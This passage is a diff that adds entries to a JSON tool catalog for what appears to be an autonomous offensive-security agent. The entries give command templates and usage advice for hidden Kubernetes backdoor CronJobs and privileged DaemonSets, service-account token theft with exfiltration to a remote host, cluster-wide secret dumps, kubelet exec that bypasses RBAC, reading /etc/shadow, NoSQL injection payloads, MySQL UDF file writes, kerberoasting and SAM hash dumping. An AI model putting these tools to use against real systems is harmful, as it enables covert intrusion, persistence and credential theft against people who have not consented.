+          "description": "Alias for claims_b64 — base64-encoded JSON claims"
+        }
+      },
+      "required": [
+        "secret",
+        "claims_b64",
+        "claims"
+      ],
+      "executor": "shell",
+      "command_template": "python3 -c \"import jwt,json,time,base64; payload=json.loads(base64.b64decode('{claims_b64}').decode()); print(jwt.encode(payload,'{secret}',algorithm='{algorithm}'))\" 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "k8s_backdoor_cronjob",
+      "version": "1.0.0",
+      "description": "DEPLOY CronJob backdoor for persistent periodic access. Creates a scheduled job that executes your command on the host (via hostPath mount). Less visible than DaemonSet. Use when you need persistent access but want lower visibility. Default schedule runs every 5 minutes.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "image": {
+          "type": "string",
+          "description": "Container image (default 'busybox')"
+        },
+        "shell_cmd": {
+          "type": "string",
+          "description": "Shell command to execute on the host (via /host mount point)"
+        },
+        "schedule": {
+          "type": "string",
+          "description": "Cron schedule (default '*/5 * * * *' = every 5 minutes)"
+        },
+        "namespace": {
+          "type": "string",
+          "description": "Target namespace (default 'kube-system')"
+        }
+      },
+      "required": [
+        "image",
+        "shell_cmd",
+        "schedule",
+        "namespace"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "k8s_backdoor_daemonset",
+      "version": "1.0.0",
+      "description": "DEPLOY privileged DaemonSet on ALL cluster nodes with host root mounted. Creates a pod on every node that can access the host filesystem via /host. Use when you have cluster-admin access and need host-level access. Start with shell_cmd='cat /host/flag*' to find flags.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "image": {
+          "type": "string",
+          "description": "Container image (default 'busybox')"
+        },
+        "shell_cmd": {
+          "type": "string",
+          "description": "Command to execute on each node's HOST filesystem (via /host mount)"
+        },
+        "namespace": {
+          "type": "string",
+          "description": "Target namespace (default 'kube-system')"
+        }
+      },
+      "required": [
+        "image",
+        "shell_cmd",
+        "namespace"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "k8s_configmap_dump",
+      "version": "1.0.0",
+      "description": "DUMP Kubernetes ConfigMaps from ALL namespaces. ConfigMaps often contain app config, env vars, and sometimes credentials. Use alongside k8s_secret_dump for complete cluster data extraction.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "token_path": {
+          "type": "string",
+          "description": "SA token path (default 'auto')"
+        }
+      },
+      "required": [
+        "token_path"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "k8s_etcd_keys",
+      "version": "1.0.0",
+      "description": "ENUMERATE etcd keys for K8s secrets. Reads directly from etcd (port 2379) without API server. Use when etcd is accessible. For HTTPS endpoints auto-skips TLS verify. Supports mutual TLS via cacert/cert/tls_key params. Start with key='/' and prefix=true to discover all keys. More direct than k8s_secret_dump — reads raw base64-encoded secrets from etcd.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "endpoint": {
+          "type": "string",
+          "description": "etcd endpoint URL (e.g. 'http://localhost:2379', 'https://10.0.0.1:2379')"
+        },
+        "key": {
+          "type": "string",
+          "description": "etcd key path to read (default '/' for all keys)"
+        },
+        "prefix": {
+          "type": "boolean",
+          "description": "Use --prefix for recursive key listing (default true)"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS certificate verification for HTTPS endpoints (default true)"
+        },
+        "cacert": {
+          "type": "string",
+          "description": "Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)"
+        },
+        "cert": {
+          "type": "string",
+          "description": "Path to client certificate for mutual TLS"
+        },
+        "tls_key": {
+          "type": "string",
+          "description": "Path to client key for mutual TLS"
+        }
+      },
+      "required": [
+        "endpoint",
+        "key",
+        "prefix",
+        "insecure",
+        "cacert",
+        "cert",
+        "tls_key"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "k8s_kubelet_exec",
+      "version": "1.0.0",
+      "description": "EXECUTE command in a pod via Kubelet API (port 10250). BYPASSES API server RBAC — communicates directly with node's kubelet. Use when kubectl_exec fails due to RBAC restrictions. Requires network access to the node's kubelet port. Find pod names via kubelet_probe or kubectl_get_pods.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "Node IP or hostname running kubelet (e.g. '10.0.0.1')"
+        },
+        "pod_name": {
+          "type": "string",
+          "description": "Target pod name to execute command in"
+        },
+        "namespace": {
+          "type": "string",
+          "description": "K8s namespace (default 'default')"
+        },
+        "container": {
+          "type": "string",
+          "description": "Container name in the pod (leave empty for auto-detect)"
+        },
+        "cmd": {
+          "type": "string",
+          "description": "Command to execute (default 'id')"
+        }
+      },
+      "required": [
+        "host",
+        "pod_name",
+        "namespace",
+        "container",
+        "cmd"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "k8s_sa_token_steal",
+      "version": "1.0.0",
+      "description": "STEAL a K8s ServiceAccount token by creating a pod in kube-system with that SA mounted. RBAC bypass — requires pod creation permission in current namespace. Target privileged SAs like 'cluster-admin', 'default', 'kube-system:default' for cluster-admin escalation.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_sa": {
+          "type": "string",
+          "description": "Target ServiceAccount name to steal (e.g. 'cluster-admin', 'default')"
+        },
+        "rhost": {
+          "type": "string",
+          "description": "Remote IP to exfiltrate token to (leave empty to print inline)"
+        },
+        "rport": {
+          "type": "integer",
+          "description": "Remote port for exfiltration (default 8888)"
+        },
+        "token_path": {
+          "type": "string",
+          "description": "Your current SA token path (default 'auto')"
+        }
+      },
+      "required": [
+        "target_sa",
+        "rhost",
+        "rport",
+        "token_path"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "k8s_secret_dump",
+      "version": "1.0.0",
+      "description": "DUMP Kubernetes secrets from ALL namespaces. Auto-detects API server, tries anonymous access then SA token. More powerful than kubectl_get_secrets — cross-namespace and multi-auth. Use when K8s API is reachable. Returns JSON with all secrets (may be base64 encoded — decode with 'echo <data> | base64 -d').",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "token_path": {
+          "type": "string",
+          "description": "Path to SA token file (default 'auto' — tries /var/run/secrets/kubernetes.io/serviceaccount/token)"
+        }
+      },
+      "required": [
+        "token_path"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "knowledge_search",
+      "version": "1.0.0",
+      "description": "Research tool — search the knowledge base for known vulnerabilities, exploitation techniques, and configuration weaknesses for a specific technology, service version, or vulnerability type. Call this BEFORE running exploit tools to identify the correct approach. Example queries: 'SQL injection MariaDB', 'JWT token bypass', 'Flask SSTI exploitation'",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "query": {
+          "type": "string",
+          "description": "Natural language query (e.g. 'IDOR in FastAPI')"
+        },
+        "category": {
+          "type": "string",
+          "description": "Optional filter: IDOR, SQLI, AUTH, RECON"
+        }
+      },
+      "required": [
+        "query",
+        "category"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "krbrelayx",
+      "version": "1.0.0",
+      "description": "Kerberos Unconstrained Delegation relay attack (AD-21). Relays captured Kerberos TGTs from unconstrained delegation hosts to gain domain admin access. Requires a machine with unconstrained delegation or the ability to coerce authentication.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target DNS hostname or IP to relay to"
+        },
+        "port": {
+          "type": "string",
+          "description": "Target port",
+          "default": "445"
+        },
+        "extra_args": {
+          "type": "string",
+          "description": "Extra krbrelayx arguments",
+          "default": ""
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "timeout 60 python3 /opt/krbrelayx/krbrelayx.py -t {target} -p {port} {extra_args} 2>&1 | head -80",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "kubectl_auth_check",
+      "version": "1.0.0",
+      "description": "Check Kubernetes RBAC permissions for a service account in a namespace",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "sa": {
+          "type": "string",
+          "description": "Service account name"
+        },
+        "namespace": {
+          "type": "string",
+          "description": "K8s namespace"
+        }
+      },
+      "required": [
+        "sa",
+        "namespace"
+      ],
+      "executor": "shell",
+      "command_template": "kubectl auth can-i --list --as={sa} -n {namespace} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "kubectl_exec",
+      "version": "1.0.0",
+      "description": "Execute a command inside a running Kubernetes pod. Use for post-exploitation after gaining pod access.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "pod": {
+          "type": "string",
+          "description": "Pod name"
+        },
+        "namespace": {
+          "type": "string",
+          "description": "K8s namespace"
+        },
+        "command": {
+          "type": "string",
+          "description": "Command to execute inside the pod"
+        }
+      },
+      "required": [
+        "pod",
+        "namespace",
+        "command"
+      ],
+      "executor": "shell_argv",
+      "command_template": "",
+      "shell_args": [
+        "kubectl",
+        "exec",
+        "{pod}",
+        "-n",
+        "{namespace}",
+        "--",
+        "{command}"
+      ],
+      "split_params": [
+        "command"
+      ],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "kubectl_get_clusterrolebindings",
+      "version": "1.0.0",
+      "description": "List all ClusterRoleBindings in the cluster. Use to identify over-privileged subjects and potential RBAC escalation paths.",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "shell",
+      "command_template": "kubectl get clusterrolebindings -o json 2>&1 | head -200",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "kubectl_get_pods",
+      "version": "1.0.0",
+      "description": "List all pods in the Kubernetes cluster across all namespaces",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "shell",
+      "command_template": "kubectl get pods -A -o json 2>&1 | head -200",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "kubectl_get_secrets",
+      "version": "1.0.0",
+      "description": "List Kubernetes secrets in a namespace",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "namespace": {
+          "type": "string",
+          "description": "K8s namespace"
+        }
+      },
+      "required": [
+        "namespace"
+      ],
+      "executor": "shell",
+      "command_template": "kubectl get secrets -n {namespace} -o json 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "kubectl_run",
+      "version": "1.0.0",
+      "description": "Create and run a pod in Kubernetes. Use for deploying test containers, privilege escalation pods, or reverse shells. Requires namespace creation permissions.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "name": {
+          "type": "string",
+          "description": "Pod name (e.g. 'test-pod')"
+        },
+        "image": {
+          "type": "string",
+          "description": "Container image (e.g. 'busybox', 'ubuntu')"
+        },
+        "namespace": {
+          "type": "string",
+          "description": "K8s namespace"
+        },
+        "command": {
+          "type": "string",
+          "description": "Command to run in the container"
+        }
+      },
+      "required": [
+        "name",
+        "image",
+        "namespace",
+        "command"
+      ],
+      "executor": "shell_argv",
+      "command_template": "",
+      "shell_args": [
+        "kubectl",
+        "run",
+        "{name}",
+        "--image={image}",
+        "--restart=Never",
+        "-n",
+        "{namespace}",
+        "--command",
+        "--",
+        "{command}"
+      ],
+      "split_params": [
+        "command"
+      ],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "kubelet_probe",
+      "version": "1.0.0",
+      "description": "Probe the Kubelet API (port 10250) for pod information. Unauthenticated access reveals running pods on the node. Use for container escape reconnaissance.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "Node IP or hostname running kubelet"
+        }
+      },
+      "required": [
+        "host"
+      ],
+      "executor": "shell",
+      "command_template": "curl -sk https://{host}:10250/pods 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ldapsearch_ad",
+      "version": "1.0.0",
+      "description": "Query Active Directory via LDAP. Use to enumerate users, groups, OUs, and domain trust relationships.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string"
+        },
+        "user": {
+          "type": "string"
+        },
+        "password": {
+          "type": "string"
+        },
+        "domain": {
+          "type": "string"
+        },
+        "base_dn": {
+          "type": "string"
+        }
+      },
+      "required": [
+        "target",
+        "user",
+        "password",
+        "domain",
+        "base_dn"
+      ],
+      "executor": "shell",
+      "command_template": "ldapsearch -x -H ldap://{target} -D '{user}@{domain}' -w '{password}' -b '{base_dn}' 2>&1 | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "linux_priv_check",
+      "version": "1.0.0",
+      "description": "Comprehensive LOCAL Linux privilege escalation check. Runs: id, uname -a, sudo -l, SUID binary search, capabilities, cron jobs, user/password enumeration. For REMOTE targets, use ssh_exec with individual commands instead.",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "shell",
+      "command_template": "echo '=== USER ===' && id && echo '=== KERNEL ===' && uname -a && echo '=== SUDO ===' && sudo -ln 2>/dev/null || echo '(no sudo)' && echo '=== SUID ===' && find / -perm -4000 -type f 2>/dev/null | head -20 && echo '=== CAPS ===' && capsh --print 2>/dev/null || cat /proc/1/status 2>/dev/null | grep -i cap || echo '(no capsh)' && echo '=== CRON ===' && ls -la /etc/cron* 2>/dev/null || echo '(no cron)' && echo '=== PASSWD ===' && cat /etc/passwd 2>/dev/null | head -20 && echo '=== SHADOW ===' && cat /etc/shadow 2>/dev/null | head -5 || echo '(no shadow read)'",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "masscan_scan",
+      "version": "1.0.0",
+      "description": "Fast port scan of top 1000 ports using masscan (much faster than nmap)",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP or CIDR range (e.g. 192.168.1.0/24)"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "masscan {target} --top-ports 1000 --rate=10000 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "metasploit_search",
+      "version": "1.0.0",
+      "description": "Search Metasploit Framework for available exploit modules, auxiliary scanners, and post-exploitation modules matching the query. Returns module name, rank, and description. Requires msfconsole installed.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "query": {
+          "type": "string",
+          "description": "Search term: software name, CVE ID, or vulnerability type (e.g. 'apache struts', 'CVE-2021-44228', 'samba')"
+        }
+      },
+      "required": [
+        "query"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "mongodb_query",
+      "version": "1.0.0",
+      "description": "Execute a MongoDB query or command. Supports NoSQL injection testing ($regex, $ne, $gt operators in query_json). For unauthenticated access, leave user and password empty. database: target DB name (e.g. 'admin', 'test'). query_json: JSON string of query or command (e.g. '{\"find\":\"users\",\"filter\":{\"username\":{\"$regex\":\".*\"}}}'). Use for MongoDB NoSQLi exploitation and unauthorized data access.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "MongoDB host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "MongoDB port (default 27017)"
+        },
+        "user": {
+          "type": "string",
+          "description": "MongoDB username. Leave empty for unauth access."
+        },
+        "password": {
+          "type": "string",
+          "description": "MongoDB password. Leave empty for unauth access."
+        },
+        "database": {
+          "type": "string",
+          "description": "MongoDB database name to query (e.g. 'admin', 'test', 'flagdb')"
+        },
+        "query_json": {
+          "type": "string",
+          "description": "JSON query string (escaped properly for shell). Use MongoDB extended JSON format. Example: '{\"find\":\"users\",\"filter\":{}}' for listing collections. '{\"find\":\"users\",\"filter\":{\"$where\":\"sleep(5000)\"}}' for blind injection time-based."
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "user",
+        "password",
+        "database",
+        "query_json"
+      ],
+      "executor": "shell",
+      "command_template": "python3 -c \"\nimport json, sys\ntry:\n    from pymongo import MongoClient\n    client = MongoClient('mongodb://{user}:{password}@{host}:{port}/')\n    db = client['{database}']\n    # Parse and execute the query\n    query_obj = json.loads('''{query_json}''')\n    if isinstance(query_obj, dict):\n        results = list(db.command(query_obj)) if 'find' not in str(query_obj).lower() else list(db.command(json.loads('''{query_json}''')))\n    else:\n        results = list(db.command(query_obj))\n    print(json.dumps(results, default=str, indent=2))\nexcept ImportError:\n    print(json.dumps({'error': 'pymongo not installed, install with: pip install pymongo'}))\nexcept Exception as e:\n    print(json.dumps({'error': str(e)}))\n\" 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "mssql_query",
+      "version": "1.0.0",
+      "description": "Execute a SQL query on a Microsoft SQL Server using sqlcmd. If sqlcmd is not available, use mssqlclient_query instead (uses impacket, already installed).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "MSSQL host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "MSSQL port (default 1433)"
+        },
+        "user": {
+          "type": "string",
+          "description": "Database username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Database password"
+        },
+        "query": {
+          "type": "string",
+          "description": "SQL query to execute"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "user",
+        "password",
+        "query"
+      ],
+      "executor": "shell",
+      "command_template": "sqlcmd -S {host},{port} -U {user} -P '{password}' -Q '{query}' 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "mssqlclient_query",
+      "version": "1.0.0",
+      "description": "Execute a SQL query on MSSQL using impacket's mssqlclient.py (pre-installed, works without sqlcmd). Use for data extraction, xp_cmdshell enabling, and linked server enumeration. Preferred over mssql_query on Linux.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "MSSQL host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "MSSQL port (default 1433)"
+        },
+        "user": {
+          "type": "string",
+          "description": "Database username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Database password"
+        },
+        "query": {
+          "type": "string",
+          "description": "SQL query to execute"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "user",
+        "password",
+        "query"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "mysql_file_write",
+      "version": "1.0.0",
+      "description": "Write a binary file to the MySQL server's filesystem via SELECT ... INTO DUMPFILE. Use for MySQL UDF privilege escalation: write a compiled UDF shared library (.so) to the plugin directory, then CREATE FUNCTION sys_exec to execute commands. Requires FILE privilege and write access to the target path. Use mysql_query first to check @@plugin_dir and @@secure_file_priv.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "MySQL host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "MySQL port (default 3306)"
+        },
+        "user": {
+          "type": "string",
+          "description": "Database username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Database password"
+        },
+        "file_path": {
+          "type": "string",
+          "description": "Absolute path on the MySQL server to write the file to (e.g. /usr/lib/mysql/plugin/udf.so)"
+        },
+        "hex_content": {
+          "type": "string",
+          "description": "Hex-encoded binary content to write (the compiled .so as hex string)"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "user",
+        "password",
+        "file_path",
+        "hex_content"
+      ],
+      "executor": "shell",
+      "command_template": "echo 'SELECT 0x{hex_content} INTO DUMPFILE \"{file_path}\"' | mysql -h {host} -P {port} -u {user} -p'{password}' 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "mysql_query",
+      "version": "1.0.0",
+      "description": "Execute a SQL query on a MySQL/MariaDB database. Use for data extraction, UDF privilege escalation checks, and reading files via LOAD_FILE().",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "MySQL host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "MySQL port (default 3306)"
+        },
+        "user": {
+          "type": "string",
+          "description": "Database username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Database password"
+        },
+        "query": {
+          "type": "string",
+          "description": "SQL query to execute"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "user",
+        "password",
+        "query"
+      ],
+      "executor": "shell",
+      "command_template": "mysql -h {host} -P {port} -u {user} -p'{password}' -e '{query}' 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "netexec_enum",
+      "version": "1.0.0",
+      "description": "Enumerate a target using NetExec (nxc). Supports protocols: smb, mssql, winrm, ssh, rdp, ftp. Use for share enumeration, user listing, and credential testing. Common flags: --shares (SMB), --users (LDAP), --local-auth (MSSQL).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "protocol": {
+          "type": "string",
+          "description": "Protocol: smb, mssql, winrm, ssh, ldap, rdp, ftp"
+        },
+        "target": {
+          "type": "string",
+          "description": "Target IP[:port] or hostname"
+        },
+        "user": {
+          "type": "string",
+          "description": "Username for authentication",
+          "default": ""
+        },
+        "password": {
+          "type": "string",
+          "description": "Password for authentication",
+          "default": ""
+        },
+        "extra_flags": {
+          "type": "string",
+          "description": "Extra nxc flags, e.g. --shares, --users, --local-auth",
+          "default": ""
+        }
+      },
+      "required": [
+        "protocol",
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "/home/kianabin/Darwin/venv/bin/netexec {protocol} {target} -u '{user}' -p '{password}' {extra_flags} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "netexec_kerberoasting",
+      "version": "1.0.0",
+      "description": "Kerberoasting via NetExec LDAP: request TGS tickets for all SPN-enabled accounts. Saves hashes in hashcat format for offline cracking. Use hash_crack tool on the output (hashcat mode 13100). Requires any authenticated domain user.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Domain Controller IP"
+        },
+        "user": {
+          "type": "string",
+          "description": "Domain username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password"
+        },
+        "output_file": {
+          "type": "string",
+          "description": "Output file for hashcat-format hashes",
+          "default": "/tmp/kerb_hashes.txt"
+        }
+      },
+      "required": [
+        "target",
+        "user",
+        "password"
+      ],
+      "executor": "shell",
+      "command_template": "/home/kianabin/Darwin/venv/bin/netexec ldap {target} -u '{user}' -p '{password}' --kerberoasting {output_file} 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "netexec_ldap_enum",
+      "version": "1.0.0",
+      "description": "Enumerate AD users via LDAP using NetExec (nxc)",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string"
+        },
+        "user": {
+          "type": "string"
+        },
+        "password": {
+          "type": "string"
+        }
+      },
+      "required": [
+        "target",
+        "user",
+        "password"
+      ],
+      "executor": "shell",
+      "command_template": "/home/kianabin/Darwin/venv/bin/netexec ldap {target} -u '{user}' -p '{password}' --users 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "netexec_smb_sam",
+      "version": "1.0.0",
+      "description": "Dump SAM database from target via NetExec SMB (requires local admin). Extracts local user NTLM hashes. Use when you have admin credentials and need local account hashes for Pass-the-Hash.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP"
+        },
+        "user": {
+          "type": "string",
+          "description": "Administrator username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password"
+        }
+      },
+      "required": [
+        "target",
+        "user",
+        "password"
+      ],
+      "executor": "shell",
+      "command_template": "/home/kianabin/Darwin/venv/bin/netexec smb {target} -u '{user}' -p '{password}' --sam 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "netexec_smb_shares",
+      "version": "1.0.0",
+      "description": "Enumerate SMB shares on a target using NetExec. Lists all accessible shares and their read/write permissions. Use to discover writable shares for file upload or to find SYSVOL for GPP/cpassword extraction. Target: IP or hostname.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP or hostname"
+        },
+        "user": {
+          "type": "string",
+          "description": "Domain username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password"
+        }
+      },
+      "required": [
+        "target",
+        "user",
+        "password"
+      ],
+      "executor": "shell",
+      "command_template": "/home/kianabin/Darwin/venv/bin/netexec smb {target} -u '{user}' -p '{password}' --shares 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "netexec_smb_users",
+      "version": "1.0.0",
+      "description": "Enumerate domain users via NetExec SMB. Lists all domain users with their group memberships. Use for discovering privileged accounts and SPN-enabled service accounts.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target Domain Controller IP"
+        },
+        "user": {
+          "type": "string",
+          "description": "Domain username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password"
+        }
+      },
+      "required": [
+        "target",
+        "user",
+        "password"
+      ],
+      "executor": "shell",
+      "command_template": "/home/kianabin/Darwin/venv/bin/netexec smb {target} -u '{user}' -p '{password}' --users 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "nikto_scan",
+      "version": "1.0.0",
+      "description": "Scan web server for known vulnerabilities, misconfigurations, and info leaks using nikto",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target URL with optional port (e.g. http://host:8080)"
+        }
+      },
+      "required": [
+        "target_url"
+      ],
+      "executor": "shell",
+      "command_template": "nikto -h {target_url} -Tuning 12345 -nointeractive 2>&1 | head -200",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
